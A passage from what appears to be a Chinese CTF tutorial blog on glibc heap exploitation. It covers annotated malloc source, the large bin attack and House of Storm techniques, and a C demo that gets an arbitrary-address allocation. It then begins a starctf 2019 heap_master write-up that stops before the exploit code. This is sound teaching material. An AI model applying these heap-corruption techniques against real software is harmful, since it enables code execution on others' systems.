class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//这个 (nb) 是我们申请的大小，判断是不是在fastbin中，直接跳过</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里如果符合smallbin执行，也跳过</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"><span class="comment">//判断smallbin，跳过</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            <span class="comment">//将victem从unsortedbin中移出来，这里是unsortedbin的核心</span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//判断当前操作(victim)的size是否和我们申请的chunk的size一样</span></span><br><span class="line">            &#123;<span class="comment">//house of strom</span></span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;<span class="comment">//如果一样直接返回</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果这个size是smallbin中的则放入smallbin中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//否则就会放入largebin中//****largebin****///</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);<span class="comment">//根据size获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);<span class="comment">//bck是获取对应bin的地址，如：main_arena+1096处</span></span><br><span class="line">              fwd = bck-&gt;fd;<span class="comment">//fwd是largebin中最大的那个chunk的头节点</span></span><br><span class="line">              </span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)<span class="comment">//这个是判断当前bin中有没有chunk</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                      <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最小的size</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最大的size</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是等于当前bin中最大的size</span></span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//这是largebin_attack的核心</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先保证largebin中有一个chunk(size&gt;0x400)</li>
<li>unsortedbin中有一个比较大的chunk(size&gt;当前laregbin中已有的chunk)</li>
</ul>
<p>然后就可以到达这个分支。</p>
<p><strong>原因：将chunk从unsortedbin中插入到largebin中缺少一些检查</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2.23 ~ 2.29版本中largebin attack的利用点，在2.30及以后的版本中，加入了双链表检测，所以在libc2.30及以后，该处的largebin attack无法使用了。</p>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的，比如0x410，中间再加上其他堆用于隔离防止合并。</li>
</ul>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><ul>
<li>free这两个chunk， frees顺序为 <code>free(0x410)</code>、<code>free(0x100)</code>，然后malloc(0x100)，这样可以保证在遍历到0x100这个合适的chunk时，能够优先从large bin范围的chunk，得到了一个large bin。</li>
</ul>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的但是比现在的large bin里的chunk要大，比如0x410 + 0x10 &#x3D; 0x420。</li>
</ul>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><ul>
<li>free这两个chunk， free顺序为 <code>free(0x420)</code>、<code>free(0x100)</code>，此时，堆布局为large bin里一个0x410的chunk，unsorted bin里一个0x420的未归位的large bin，并且未归位的这个0x420的chunk与0x410的large bin属于同一个index。</li>
</ul>
<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><ul>
<li>UAF或其他漏洞，控制large bin里那个chunk的bk和bk_nexsize。</li>
</ul>
<h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><ul>
<li>malloc(0x100)，使得malloc遍历unsorted bin，将0x420的chunk放入large bin，发生large bin attack。</li>
</ul>
<h2 id="Large-bin-attack的利用"><a href="#Large-bin-attack的利用" class="headerlink" title="Large bin attack的利用"></a>Large bin attack的利用</h2><h3 id="结合IO-FILE-hijack"><a href="#结合IO-FILE-hijack" class="headerlink" title="结合IO_FILE hijack"></a>结合IO_FILE hijack</h3><ul>
<li>利用large bin attack的任意地址写漏洞特性，错误地将IO 2 1 stdout内部的<code>_IO_write_base</code>修改为0，使得程序调用puts等函数时，能够影响泄露出libc地址，这也就是劫持了stdout。</li>
</ul>
<h3 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h3><ul>
<li>传统的house of orange是利用unsorted bin attack将IO_list全写一个<code>main_arena + 88</code>地址，然后通过<code>chain_next</code>进行转移，而large bin attack更加方便，直接在IO_list全写上一个堆地址，进而伪造IO_FILE结构。</li>
</ul>
<h3 id="Hijack-global-fastmax"><a href="#Hijack-global-fastmax" class="headerlink" title="Hijack global_fastmax"></a>Hijack global_fastmax</h3><ul>
<li>通过large bin attack将<code>global_max_fast</code>修改为一个堆地址，导致free任何chunk，都将放入fastbin，从而利用fastbin attack达到任意地址分配。</li>
</ul>
<h3 id="House-of-strom"><a href="#House-of-strom" class="headerlink" title="House of strom"></a>House of strom</h3><p>理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。</p>
<p>那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。</p>
<h2 id="House-of-strom-1"><a href="#House-of-strom-1" class="headerlink" title="House of strom"></a>House of strom</h2><h3 id="House-of-strom原理"><a href="#House-of-strom原理" class="headerlink" title="House of strom原理"></a>House of strom原理</h3><p>该利用手法适用于glibc 2.28及以下的版本，因为unsorted bin attack在glibc 2.29中已失效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line"><span class="comment">//只进行检查了chunk的size == nb（nb申请的大小）</span></span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">    <span class="comment">//这里会直接返回p,p就是victim,victim = unsorted_chunks (av)-&gt;bk</span></span><br><span class="line">    <span class="comment">//victim又是unsorted_chunks的bk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们将house of strom里的步骤改一下，将0x100的unsorted bin转换成任意地址，即通过修改unsorted bin里未归位的large bin的bk指针指向任意地址addr，然后修改large bin里有的那个chunk的bk_nexsize为addr - 0x18 - 0x5（错位写入堆地址）。</p>
<p>通过malloc(0x40)即可分配到任意地址addr + 0x10处，这里是因为large bin attack里victim-&gt;bk_nexsize-&gt;fd_nexsize &#x3D; victim即(addr - 0x18 - 0x5) + 0x18 &#x3D; victim，即addr - 0x5 &#x3D; victim。在PIE下，victim地址一般为0x55或0x56开头，并且有6字节有效数据，此时，即相当于*(char *)(addr - 0x5 + 0x5) &#x3D; (addr &gt;&gt; 40) &amp; 0xFF，也就是在addr处写入了0x55或0x56，可以用来充当unsorted bin的size，这样，接下来继续回溯unsorted bin时，仅检查size是否符合请求的一样，一样就可以直接返回这个地址，实现任意地址分配。</p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">//将p1放入large bin</span></span><br><span class="line">   <span class="built_in">free</span>(p2); <span class="comment">//p2放入unsorted bin   </span></span><br><span class="line">   <span class="type">size_t</span> addr = (<span class="type">size_t</span>)(buf - <span class="number">0x10</span>);</span><br><span class="line">   *(<span class="type">size_t</span> *)(p1+<span class="number">0x8</span>) = addr + <span class="number">0x8</span>; <span class="comment">//修改large bin的bk</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = addr - <span class="number">0x18</span> - <span class="number">0x5</span>; <span class="comment">//修改large bin的bk_nextsize</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p2 + <span class="number">0x8</span>) = addr;<span class="comment">//修改unsorted bin的bk</span></span><br><span class="line">   <span class="type">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x48</span>); <span class="comment">//申请到addr处</span></span><br><span class="line">   <span class="built_in">strcpy</span>(p,<span class="string">&quot;hello,welcome to pwn world\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf_2019_heap_master"></a>starctf_2019_heap_master</h3><p>ubuntu16.04，glibc2.23&#x2F;glibc2.25</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@70b53f87c516:~/pwn/实验脚本$ checksec starctf_2019_heap_master</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/实验脚本/starctf_2019_heap_master&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<h4 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h5><p><img data-src="/../images/image-20250327214259281.png" alt="image-20250327214259281"></p>
<h5 id="prog-init"><a href="#prog-init" class="headerlink" title="prog_init()"></a>prog_init()</h5><p><img data-src="/../images/image-20250327214321585.png" alt="image-20250327214321585"></p>
<h5 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h5><p><img data-src="/../images/image-20250327214413213.png" alt="image-20250327214413213"></p>
<p>add()函数，只能malloc()，而不存堆指针</p>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h5><p><img data-src="/../images/image-20250327214449386.png" alt="image-20250327214449386"></p>
<p>delete()函数，只能free heap_base范围内的</p>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h5><p><img data-src="/../images/image-20250327214738926.png" alt="image-20250327214738926"></p>
<p>edit()函数也是只能改heap_base范围内的</p>
<p>程序功能上看：</p>
<ul>
<li>程序不能控制add()中malloc()出来的chunk</li>
<li>edit()和delete()只能在heap_base范围内</li>
<li>漏洞点在于可以delete()后继续编辑堆，uaf</li>
</ul>
<p><strong>重点关注的是：这道题的目的之一是让我们在heap_base的范围上去布局堆内存</strong></p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>程序没有show功能，并且开启了PIE，第一步应该该泄露地址，程序里有调用puts等函数，因而可以hijack IO_2_1_stdout，这里可以用unsorted bin attack或者large bin attack，如果用了unsorted bin attack，后续的利用将无法继续，因为unsorted bin被破坏了，因此，我们选择large bin attack来攻击IO_2_1_stdout。</p>
<p>对于篡改IO_2_1_stdout来泄露数据，flags有要求，必须得经过这两个if，才能到达后方调用syswrite将_IO_write_base与_IO_write_ptr之间的数据信息泄露出来，这就要求flags的<strong>低1字节的低4位不能为8</strong>，<strong>第二字节的低4位必须要为8</strong>，也就是说，我们的unsorted bin chunk地址末尾地址应该为0x800这样。</p>
<p>从以上分析来看，large bin attack攻击IO_2_1_stdout是最为合适的，因为需要修改IO_2_1_stdout里的两处内容，即flags和_IO_write_base。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>一次运行可能会不成功，这是因为hijack_stdout时需要爆破一个字节</p>
